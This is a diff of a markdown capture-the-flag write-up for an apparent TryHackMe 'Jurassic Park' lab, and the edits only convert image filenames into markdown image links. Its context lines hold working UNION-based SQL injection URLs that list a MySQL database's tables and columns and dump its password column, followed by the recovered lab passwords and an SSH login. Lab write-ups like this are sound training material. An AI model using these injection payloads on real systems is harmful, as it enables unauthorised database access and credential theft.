@@ -41,7 +41,7 @@ Nmap done: 1 IP address (1 host up) scanned in 21.78 seconds
 
 Looking at the page on port 80 we find a simple site:
 
-thm_jpark_site.png
+![thm_jpark_site.png](../assets/jurassic_park_assets/thm_jpark_site.png)
 
 Following the online shop link we are redirected to http://10.10.74.251/shop.php
 
@@ -49,7 +49,7 @@ Clicking on purchase package we are redirected to http://10.10.74.251/item.php?i
 
 Trying something like `id=2'` we trigger  this warning:
 
-thm_jpark_nope.png
+![thm_jpark_nope.png](../assets/jurassic_park_assets/thm_jpark_nope.png)
 
 Which at the very bottom humorously has:
 
@@ -61,7 +61,7 @@ We can confirm the page is vulnerable to SQL injection with: `http://10.10.74.25
 
 Continuing to enumerate and also test for IDOR, we find a 'development package' as id=5:
 
-thm_jpark_5.png
+![thm_jpark_5.png](../assets/jurassic_park_assets/thm_jpark_5.png)
 
 Cool. So it looks like there is some character blacklisting going on here.
 
@@ -79,7 +79,7 @@ Because we know that the `@` sign is blocked, we can get the Mysql version using
 http://10.10.165.197/item.php?id=1%20UNION%20select%201,version(),3,4,5
 ```
 
-thm_jpark_version.png
+![thm_jpark_version.png](../assets/jurassic_park_assets/thm_jpark_version.png)
 
 We can also begin enumerating the DB with `database()`:
 
@@ -87,7 +87,7 @@ We can also begin enumerating the DB with `database()`:
 http://10.10.165.197/item.php?id=1%20UNION%20select%201,database(),3,4,5
 ```
 
-thm_jpark_db.png
+![thm_jpark_db.png](../assets/jurassic_park_assets/thm_jpark_db.png)
 
 Viewing the tables:
 
@@ -95,7 +95,7 @@ Viewing the tables:
 http://10.10.165.197/item.php?id=1%20UNION%20select%201,TABLE_NAME,TABLE_SCHEMA,4,5%20from%20INFORMATION_SCHEMA.TABLES%20where%20table_schema=%22park%22
 ```
 
-thm_jpark_tables.png
+![thm_jpark_tables.png](../assets/jurassic_park_assets/thm_jpark_tables.png)
 
 Columns:
 
@@ -103,7 +103,7 @@ Columns:
 http://10.10.165.197/item.php?id=1%20UNION%20select%201,group_concat(COLUMN_NAME),TABLE_NAME,4,5%20from%20INFORMATION_SCHEMA.COLUMNS%20where%20table_name=%22users%22
 ```
 
-thm_jpark_columns.png
+![thm_jpark_columns.png](../assets/jurassic_park_assets/thm_jpark_columns.png)
 
 Note, we need to use the `group_concat` here
 
@@ -114,7 +114,7 @@ The string `username` is being blacklisted, but we know we are looking for the p
 ```
 http://10.10.165.197/item.php?id=1%20UNION%20select%201,%20group_concat(password),%203,%204,5%20from%20park.users
 ``` 
-thm_jpark_pass.png
+![thm_jpark_pass.png](../assets/jurassic_park_assets/thm_jpark_pass.png)
 
 We now have the passwords D0nt3ATM3 and ih8dinos
 
@@ -127,7 +127,7 @@ We can login to SSH with `dennis:ih8dinos`
 
 And grab the flag1.txt flag:
 
-thm_jpark_flag1.png
+![thm_jpark_flag1.png](../assets/jurassic_park_assets/thm_jpark_flag1.png)
 
 ### Privilege Escalation
 
@@ -157,7 +157,7 @@ ip-10-10-165-197
 
 We can then grab flag5:
 
-thm_jpark_flag5.png
+![thm_jpark_flag5.png](../assets/jurassic_park_assets/thm_jpark_flag5.png)
 
 Going back to find the other flags we find flag2's location in `.viminfo`:
 
@@ -172,11 +172,11 @@ Going back to find the other flags we find flag2's location in `.viminfo`:
 '6  1  0  /var/www/html/index.php
 ```
 
-thm_jpark_flag2.png
+![thm_jpark_flag2.png](../assets/jurassic_park_assets/thm_jpark_flag2.png)
 
 And we can also find flag3 in `.bash_history`
 
-thm_jpark_flag3.png
+![thm_jpark_flag3.png](../assets/jurassic_park_assets/thm_jpark_flag3.png)
 
 Thanks for following along!
 
